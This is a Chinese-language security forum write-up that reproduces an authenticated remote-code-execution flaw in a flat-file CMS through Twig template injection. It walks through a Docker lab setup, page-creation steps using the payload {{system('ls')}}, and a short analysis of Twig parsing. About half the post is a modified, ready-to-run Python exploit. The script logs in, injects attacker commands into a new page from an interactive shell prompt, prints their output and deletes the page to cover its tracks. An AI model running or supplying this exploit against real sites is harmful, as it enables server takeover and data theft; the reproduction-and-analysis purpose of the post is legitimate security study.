环境搭建
----

利用docker搭建环境,发现该cms不需要数据库,数据是直接写在了文件当中的.  
关键需要开启环境配置中的Twig选项  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-20f1f19fd2e278ea49e614957b743a5cf8c1c645.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-20f1f19fd2e278ea49e614957b743a5cf8c1c645.png)

漏洞复现
----

该漏洞的exp是从expdb上面下载的,但是实际跑出来的时候发现他在构造exp中的form\_id和nonce的时候爬取出来的数据是错误的,于是做了修改  
此处是修改后的exp

```php
import requests
from bs4 import BeautifulSoup
import random
import string

username = 'admin'
password = 'Admin888'
url = 'http://127.0.0.1'

session = requests.Session()

# Autheticating
## Getting login-nonce
def login(url,username,password):
    r = session.get(url + "/admin")
    soup = BeautifulSoup(r.text, features="lxml")
    nonce = str(soup.findAll('input')[2])
    nonce = nonce[47:79]

    ## Logging in
    payload =f'data%5Busername%5D={username}&data%5Bpassword%5D={password}&task=login&login-nonce={nonce}'
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    r = session.post(url+"/admin",data=payload,headers=headers)

# Creating Page for RCE

def rce(url,cmd):
    ## Getting form nonce and unique form id
    project_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8))
    r = session.get(url+f"/admin/pages/{project_name}/:add")
    #print(r.text)
    soup = BeautifulSoup(r.text, features="lxml")
    # print(soup)
    form_id = str(soup.findAll('input')[-2])
    nonce = str(soup.findAll('input')[-1])
    form_id = form_id[54:86]
    nonce = nonce[46:78]
    # print(form_id)
    # print(nonce)

    ## Creating Page
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = f'task=save&data%5Bheader%5D%5Btitle%5D={project_name}&data%5Bcontent%5D=%7B%7B+system%28%27{cmd}%27%29+%7D%7D&data%5Bfolder%5D={project_name}&data%5Broute%5D=&data%5Bname%5D=default&data%5Bheader%5D%5Bbody_classes%5D=&data%5Bordering%5D=1&data%5Border%5D=&toggleable_data%5Bheader%5D%5Bprocess%5D=on&data%5Bheader%5D%5Bprocess%5D%5Btwig%5D=1&data%5Bheader%5D%5Border_by%5D=&data%5Bheader%5D%5Border_manual%5D=&data%5Bblueprint%5D=&data%5Blang%5D=&_post_entries_save=edit&__form-name__=flex-pages&__unique_form_id__={form_id}&form-nonce={nonce}&toggleable_data%5Bheader%5D%5Bpublished%5D=0&toggleable_data%5Bheader%5D%5Bdate%5D=0&toggleable_data%5Bheader%5D%5Bpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bunpublish_date%5D=0&toggleable_data%5Bheader%5D%5Bmetadata%5D=0&toggleable_data%5Bheader%5D%5Bdateformat%5D=0&toggleable_data%5Bheader%5D%5Bmenu%5D=0&toggleable_data%5Bheader%5D%5Bslug%5D=0&toggleable_data%5Bheader%5D%5Bredirect%5D=0&data%5Bheader%5D%5Bprocess%5D%5Bmarkdown%5D=0&toggleable_data%5Bheader%5D%5Btwig_first%5D=0&toggleable_data%5Bheader%5D%5Bnever_cache_twig%5D=0&toggleable_data%5Bheader%5D%5Bchild_type%5D=0&toggleable_data%5Bheader%5D%5Broutable%5D=0&toggleable_data%5Bheader%5D%5Bcache_enable%5D=0&toggleable_data%5Bheader%5D%5Bvisible%5D=0&toggleable_data%5Bheader%5D%5Bdebugger%5D=0&toggleable_data%5Bheader%5D%5Btemplate%5D=0&toggleable_data%5Bheader%5D%5Bappend_url_extension%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bdefault%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Bcanonical%5D=0&toggleable_data%5Bheader%5D%5Broutes%5D%5Baliases%5D=0&toggleable_data%5Bheader%5D%5Badmin%5D%5Bchildren_display_order%5D=0&toggleable_data%5Bheader%5D%5Blogin%5D%5Bvisibility_requires_access%5D=0'
    print(payload)
    r = session.post(url+f"/admin/pages/{project_name}/:add",data=payload,headers=headers)
    # print(r.text)
    ## Getting command output
    r = session.get(url+f"/{project_name.lower()}")
    if 'SyntaxError' in r.text:
        print("[-] Command error")
    else:
        a = r.text.split('<section id="body-wrapper" class="section">')
        b = a[1].split('</section>')
        print(b[0][58:])

    # Cleaning up
    ## Getting admin-nonce
    r = session.get(url + "/admin/pages")
    soup = BeautifulSoup(r.text, features="lxml")
    nonce = str(soup.findAll('input')[32])
    nonce = nonce[47:79]

    ## Deleting Page
    r = session.get(url+f"/admin/pages/{project_name.lower()}/task:delete/admin-nonce:{nonce}")

login(url,username,password)

while True:
    cmd = input("$ ")
    rce(url,cmd)
```

直接输入即可命令执行  
具体实际上的网页操作如下  
首先利用用户名和密码登陆后台  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-02ea975146757786085441a1abf3b46ff8255551.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-02ea975146757786085441a1abf3b46ff8255551.png)  
然后选择page并且新建一个页面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-39edb8bc47c133e709bf5097d90eaed03c2d6a26.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-39edb8bc47c133e709bf5097d90eaed03c2d6a26.png)  
随机输入数据  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d83ba01ca48be244ef6320122981c5b67edbf94e.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-d83ba01ca48be244ef6320122981c5b67edbf94e.png)  
然后在content处输入payload数据`{{system('ls')}}`其中system中的数据可以替换成任意的命令执行的数据  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-cc2f5288811d91bd5c3fa742875049fc5430c939.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-cc2f5288811d91bd5c3fa742875049fc5430c939.png)  
前台选中这个page即可执行该命令  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6cb7d270e288d683dd41d34d0e19a8fd46310220.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-6cb7d270e288d683dd41d34d0e19a8fd46310220.png)

漏洞分析
----

首先是在后台编辑了conten中的数据为特殊个是然后在page总保存为了page.md  
根据官方文档我们知道用户的内容都储存在user/pages/中.并且两个页面是单独的文件夹子中存存储的markdown文件  
所以页面是以makdown语法构成,通过解析轻松的转换为html,后台编辑新的页面可以直接生成文件夹并且利用默认的模版格式.  
我们修改的地方可以知道是从该图片知道  
[![](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1928f6ceb0f36d59b73e67dc6a5745707341c475.png)](https://shs3.b.qianxin.com/attack_forum/2021/06/attach-1928f6ceb0f36d59b73e67dc6a5745707341c475.png)  
保存在/user/config/system.yaml中  
可以看到开启了twig后是图片中的数据由false变为了true  
阅读官网文档可以知道是利用twig解析模版,在内容中使用了Twig功能.  
那么重要的就是twig是如何解析代码的  
我们知道Twig是一个快速的优化的php引擎,可以将模版编译为普通的php  
TWig主要是有两个语法  
{{ }} 打印出表达式的输出结果  
{% %} 执行语句  
所以此处我们利用system('ls')执行php的代码输出结果  
该漏洞其实已经分析完毕  
漏洞很简单只是利用了twig模版的解析执行php代码,更多可以去阅读官方文档来深入学习,在这就不做赘述了  
附上文档的网站  
<https://www.kancloud.cn/yunye/twig-cn>